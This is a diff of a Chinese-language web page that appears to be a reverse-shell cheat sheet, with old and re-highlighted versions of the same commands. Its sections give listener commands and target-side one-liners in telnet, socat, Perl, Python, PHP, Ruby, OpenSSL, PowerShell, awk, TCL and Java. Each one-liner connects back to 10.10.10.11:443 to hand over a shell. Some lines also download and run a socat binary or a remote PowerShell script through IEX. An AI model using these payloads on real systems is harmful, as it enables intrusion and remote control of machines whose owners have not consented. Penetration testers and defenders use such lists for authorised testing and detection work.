-<pre><code class="bash">rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|telnet 10.10.10.11 443 &gt; f</code></pre>
-<pre><code class="bash">rm -f x; mknod x p &amp;&amp; telnet 10.10.10.11 443 0&lt;x | /bin/bash 1&gt;x</code></pre>
+<pre><code class="hljs bash">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet 10.10.10.11 443 0/tmp/p 2&gt;&amp;1</code></pre>
+
+<pre><code class="hljs bash">telnet 10.10.10.11 443 | /bin/bash | telnet 10.10.10.11 444</code></pre>
+
+<pre><code class="hljs bash">rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|telnet 10.10.10.11 443 &gt; f</code></pre>
+
+<pre><code class="hljs bash">rm -f x; mknod x p &amp;&amp; telnet 10.10.10.11 443 0&lt;x | /bin/bash 1&gt;x</code></pre>
+
 <h4 id="6、使用Socat反弹shell"><a href="#6、使用Socat反弹shell" class="headerlink" title="6、使用Socat反弹shell"></a>6、使用Socat反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">socat file:`tty`,raw,echo=0 TCP-L:443</code></pre>
+<pre><code class="hljs bash">socat file:`tty`,raw,<span class="hljs-built_in">echo</span>=0 TCP-L:443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
-<pre><code class="bash">/tmp/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443</code></pre>
-<pre><code class="bash">socat tcp-connect:10.10.10.11:443 exec:&quot;bash -li&quot;,pty,stderr,setsid,sigint,sane</code></pre>
-<pre><code class="bash">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443</code></pre>
+<pre><code class="hljs bash">/tmp/socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443</code></pre>
+
+<pre><code class="hljs bash">socat tcp-connect:10.10.10.11:443 <span class="hljs-built_in">exec</span>:<span class="hljs-string">"bash -li"</span>,pty,stderr,setsid,sigint,sane</code></pre>
+
+<pre><code class="hljs bash">wget -q https://github.com/andrew<span class="hljs-_">-d</span>/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443</code></pre>
+
 <h4 id="7、利用Perl脚本反弹"><a href="#7、利用Perl脚本反弹" class="headerlink" title="7、利用Perl脚本反弹"></a>7、利用Perl脚本反弹</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
-<pre><code class="bash">perl -e &#39;use Socket;$i=&quot;10.10.10.11&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</code></pre>
-<pre><code class="bash">perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.10.10.11:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre>
+<pre><code class="hljs bash">perl -e <span class="hljs-string">'use Socket;$i="10.10.10.11";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></code></pre>
+
+<pre><code class="hljs bash">perl -MIO -e <span class="hljs-string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.10.11:443");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></code></pre>
+
 <p>win平台下执行：</p>
-<pre><code class="bash">perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&quot;10.10.10.11:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre>
+<pre><code class="hljs bash">perl -MIO -e <span class="hljs-string">'$c=new IO::Socket::INET(PeerAddr,"10.10.10.11:443");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></code></pre>
+
 <h4 id="8、利用Python脚本反弹shell"><a href="#8、利用Python脚本反弹shell" class="headerlink" title="8、利用Python脚本反弹shell"></a>8、利用Python脚本反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
 <p>IPv4协议如下：</p>
-<pre><code class="bash">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre>
-<pre><code class="bash">export RHOST=&quot;10.10.10.11&quot;;export RPORT=443;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;</code></pre>
-<pre><code class="bash">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre>
+<pre><code class="hljs bash">python -c <span class="hljs-string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.11",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></code></pre>
+
+<pre><code class="hljs bash"><span class="hljs-built_in">export</span> RHOST=<span class="hljs-string">"10.10.10.11"</span>;<span class="hljs-built_in">export</span> RPORT=443;python -c <span class="hljs-string">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span></code></pre>
+
+<pre><code class="hljs bash">python -c <span class="hljs-string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.11",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span></code></pre>
+
 <p>IPv6协议如下：</p>
-<pre><code class="bash">python -c &#39;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,443,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&quot;/bin/sh&quot;);&#39;</code></pre>
+<pre><code class="hljs bash">python -c <span class="hljs-string">'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",443,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'</span></code></pre>
+
 <p>Windows平台如下:</p>
-<pre><code class="bash">C:\Python27\python.exe -c &quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;10.10.10.11&#39;, 443)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&#39;try&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\windows\\system32\\cmd.exe&#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&quot;</code></pre>
+<pre><code class="hljs bash">C:\Python27\python.exe -c <span class="hljs-string">"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.10.10.11', 443)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), &#123;'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])&#125;)(), type('try', (), &#123;'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]&#125;)())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])(&#123;&#125;), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) &gt; 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])(&#123;&#125;), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"</span></code></pre>
+
 <h4 id="9、利用PHP脚本反弹shell"><a href="#9、利用PHP脚本反弹shell" class="headerlink" title="9、利用PHP脚本反弹shell"></a>9、利用PHP脚本反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
-<pre><code class="bash">php -r &#39;$sock=fsockopen(&quot;10.10.10.11&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre>
-<pre><code class="bash">php -r &#39;$s=fsockopen(&quot;10.10.10.11&quot;,443);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);&#39;</code></pre>
-<pre><code class="bash">php -r &#39;$s=fsockopen(&quot;10.10.10.11&quot;,443);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre>
-<pre><code class="bash">php -r &#39;$s=fsockopen(&quot;10.10.10.11&quot;,443);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#39;</code></pre>
-<pre><code class="bash">php -r &#39;$s=fsockopen(&quot;10.10.10.11&quot;,443);system(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre>
-<pre><code class="bash">php -r &#39;$s=fsockopen(&quot;10.10.10.11&quot;,443);popen(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&#39;</code></pre>
-<pre><code class="bash">php -r &#39;$s=\&#39;127.0.0.1\&#39;;$p=443;@error_reporting(0);@ini_set(&quot;error_log&quot;,NULL);@ini_set(&quot;log_errors&quot;,0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open(\&#39;/bin/sh$IFS-i\&#39;,array(array(\&#39;pipe\&#39;,\&#39;r\&#39;),array(\&#39;pipe\&#39;,\&#39;w\&#39;),array(\&#39;pipe\&#39;,\&#39;w\&#39;)),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die(\&#39;connection/closed\&#39;);if(feof($p[1]))die(\&#39;shell/not/response\&#39;);$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die(&quot;proc_open/disabled&quot;);}}else{die(&quot;not/connect&quot;);}&#39;</code></pre>
+<pre><code class="hljs bash">php -r <span class="hljs-string">'$sock=fsockopen("10.10.10.11",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></code></pre>
+
+<pre><code class="hljs bash">php -r <span class="hljs-string">'$s=fsockopen("10.10.10.11",443);$proc=proc_open("/bin/sh -i", array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);'</span></code></pre>
+
+<pre><code class="hljs bash">php -r <span class="hljs-string">'$s=fsockopen("10.10.10.11",443);shell_exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></code></pre>
+
+<pre><code class="hljs bash">php -r <span class="hljs-string">'$s=fsockopen("10.10.10.11",443);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;'</span></code></pre>
+
+<pre><code class="hljs bash">php -r <span class="hljs-string">'$s=fsockopen("10.10.10.11",443);system("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></code></pre>
+
+<pre><code class="hljs bash">php -r <span class="hljs-string">'$s=fsockopen("10.10.10.11",443);popen("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3", "r");'</span></code></pre>
+
+<pre><code class="hljs bash">php -r <span class="hljs-string">'$s=\'</span>127.0.0.1\<span class="hljs-string">';$p=443;@error_reporting(0);@ini_set("error_log",NULL);@ini_set("log_errors",0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n))&#123;if($x=proc_open(\'</span>/bin/sh<span class="hljs-variable">$IFS</span>-i\<span class="hljs-string">',array(array(\'</span>pipe\<span class="hljs-string">',\'</span>r\<span class="hljs-string">'),array(\'</span>pipe\<span class="hljs-string">',\'</span>w\<span class="hljs-string">'),array(\'</span>pipe\<span class="hljs-string">',\'</span>w\<span class="hljs-string">')),$p,getcwd()))&#123;stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true)&#123;if(feof($s))die(\'</span>connection/closed\<span class="hljs-string">');if(feof($p[1]))die(\'</span>shell/not/response\<span class="hljs-string">');$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));&#125;fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);&#125;else&#123;die("proc_open/disabled");&#125;&#125;else&#123;die("not/connect");&#125;'</span></code></pre>
+
 <h4 id="10、利用Ruby脚本反弹shell"><a href="#10、利用Ruby脚本反弹shell" class="headerlink" title="10、利用Ruby脚本反弹shell"></a>10、利用Ruby脚本反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
-<pre><code class="bash">ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.10.10.11&quot;,443).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code></pre>
-<pre><code class="bash">ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;10.10.10.11&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</code></pre>
+<pre><code class="hljs bash">ruby -rsocket -e<span class="hljs-string">'f=TCPSocket.open("10.10.10.11",443).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></code></pre>
+
+<pre><code class="hljs bash">ruby -rsocket -e <span class="hljs-string">'exit if fork;c=TCPSocket.new("10.10.10.11","443");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></code></pre>
+
 <p>Windows平台如下：</p>
-<pre><code class="bash">ruby -rsocket -e &#39;c=TCPSocket.new(&quot;10.10.10.11&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</code></pre>
+<pre><code class="hljs bash">ruby -rsocket -e <span class="hljs-string">'c=TCPSocket.new("10.10.10.11","443");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></code></pre>
+
 <h4 id="11、使用OpenSSL反弹shell"><a href="#11、使用OpenSSL反弹shell" class="headerlink" title="11、使用OpenSSL反弹shell"></a>11、使用OpenSSL反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre>
-<pre><code class="bash">openssl s_server -quiet -key key.pem -cert cert.pem -port 443</code></pre>
-<pre><code class="bash">ncat --ssl -vv -l -p 443</code></pre>
+<pre><code class="hljs bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre>
+
+<pre><code class="hljs bash">openssl s_server -quiet -key key.pem -cert cert.pem -port 443</code></pre>
+
+<pre><code class="hljs bash">ncat --ssl -vv -l -p 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
-<pre><code class="bash">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 10.10.10.11:443 &gt; /tmp/s; rm /tmp/s</code></pre>
+<pre><code class="hljs bash">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 10.10.10.11:443 &gt; /tmp/s; rm /tmp/s</code></pre>
+
 <h4 id="12、win平台下使用Powershell反弹shell"><a href="#12、win平台下使用Powershell反弹shell" class="headerlink" title="12、win平台下使用Powershell反弹shell"></a>12、win平台下使用Powershell反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
-<pre><code class="bash">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;10.10.10.11&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</code></pre>
-<pre><code class="bash">powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.10.11&#39;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</code></pre>
-<pre><code class="bash">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#39;)</code></pre>
+<pre><code class="hljs bash">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(<span class="hljs-string">"10.10.10.11"</span>,443);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[byte[]]<span class="hljs-variable">$bytes</span> = 0..65535|%&#123;0&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, 0, <span class="hljs-variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,0, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="hljs-variable">$sendback2</span>  = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">"PS "</span> + (<span class="hljs-built_in">pwd</span>).Path + <span class="hljs-string">"&gt; "</span>;<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,0,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()</code></pre>
+
+<pre><code class="hljs bash">powershell -nop -c <span class="hljs-string">"<span class="hljs-variable">$client</span> = New-Object System.Net.Sockets.TCPClient('10.10.10.11',443);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[byte[]]<span class="hljs-variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, 0, <span class="hljs-variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,0, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + 'PS ' + (pwd).Path + '&gt; ';<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,0,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()"</span></code></pre>
+
+<pre><code class="hljs bash">powershell IEX (New-Object Net.WebClient).DownloadString(<span class="hljs-string">'https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1'</span>)</code></pre>
+
 <h4 id="13、利用Awk反弹shell"><a href="#13、利用Awk反弹shell" class="headerlink" title="13、利用Awk反弹shell"></a>13、利用Awk反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
-<pre><code class="bash">awk &#39;BEGIN {s = &quot;/inet/tcp/0/10.10.10.11/443&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}&#39; /dev/null</code></pre>
+<pre><code class="hljs bash">awk <span class="hljs-string">'BEGIN &#123;s = "/inet/tcp/0/10.10.10.11/443"; while(42) &#123; do&#123; printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != "exit") close(s); &#125;&#125;'</span> /dev/null</code></pre>
+
 <h4 id="14、TCL脚本反弹shell"><a href="#14、TCL脚本反弹shell" class="headerlink" title="14、TCL脚本反弹shell"></a>14、TCL脚本反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
-<pre><code class="bash">echo &#39;set s [socket 10.10.10.11 443];while 42 { puts -nonewline $s &quot;shell&gt;&quot;;flush $s;gets $s c;set e &quot;exec $c&quot;;if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;&#39; | tclsh</code></pre>
+<pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">'set s [socket 10.10.10.11 443];while 42 &#123; puts -nonewline $s "shell&gt;";flush $s;gets $s c;set e "exec $c";if &#123;![catch &#123;set r [eval $e]&#125; err]&#125; &#123; puts $s $r &#125;; flush $s; &#125;; close $s;'</span> | tclsh</code></pre>
+
 <h4 id="15、Java版本反弹shell"><a href="#15、Java版本反弹shell" class="headerlink" title="15、Java版本反弹shell"></a>15、Java版本反弹shell</h4><p>首先在本地监听TCP协议443端口</p>
-<pre><code class="bash">nc -lvp 443</code></pre>
+<pre><code class="hljs bash">nc -lvp 443</code></pre>
+
 <p>然后在靶机上执行如下命令：</p>
 <p>linux平台：</p>
-<pre><code class="java">r = Runtime.getRuntime()
-p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.10.10.11/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+<pre><code class="hljs java">r = Runtime.getRuntime()
+p = r.exec([<span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"exec 5&lt;&gt;/dev/tcp/10.10.10.11/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])
 p.waitFor()</code></pre>
+
 <p>windows平台：</p>
